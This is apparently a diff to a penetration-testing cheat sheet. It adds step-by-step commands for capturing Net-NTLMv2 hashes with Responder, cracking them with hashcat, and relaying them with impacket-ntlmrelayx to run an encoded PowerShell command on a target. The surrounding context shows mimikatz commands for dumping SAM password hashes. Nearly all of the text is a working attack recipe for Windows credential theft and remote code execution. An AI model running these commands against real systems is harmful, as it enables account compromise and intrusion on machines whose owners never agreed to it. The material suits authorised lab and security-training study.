@@ -3508,7 +3508,7 @@ HTTP POST Attack
 3. `token::elevate` elevate the security token from high integrity (administrator) to SYSTEM integrity
 4. `lsadump::sam` dump the contents of the SAM database
 
-#### Crack NTLM
+#### Cracking NTLM
 1. Identify the local users with `Get-LocalUser`
 2. Run `mimikatz.exe` as an administrator
 3. Use the command `privilege::debug` to have `SeDebugPrivilege` access right enabled
@@ -3518,6 +3518,22 @@ HTTP POST Attack
    - `lsadump::sam` extracts the NTLM hashes from the SAM
 6. Run `hashcat --help | grep -i "ntlm"` to retrieve the correct hash mode
 7. `hashcat -m 1000 user.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force`
+
+#### Cracking Net-NTLMv2 (or NTLMv2)
+
+Capture a Net-NTLMv2 hash
+1. `ip a` retrieve a list of all interfaces
+2. `sudo responder -I <interface>`
+3. Wait for a connection, capture the hash and save it as `user.hash`
+
+Crack the Net-NTLMv2 hash
+1. `hashcat --help | grep -i "ntlm"`
+2. `hashcat -m 5600 user.hash /usr/share/wordlists/rockyou.txt --force`
+
+Relaying Net-NTLMv2
+1. Instead of printing a retrieved Net-NTLMv2 hash, we'll forward it to `<IP>` that it's the target machine
+2. `sudo impacket-ntlmrelayx --no-http-server -smb2support -t <IP> -c "powershell -enc <BASE64>"`
+3. Now, if a user tries to connect to our machine, it will forward the request to `<IP>`
 
 
 #### Pass-the-Hash
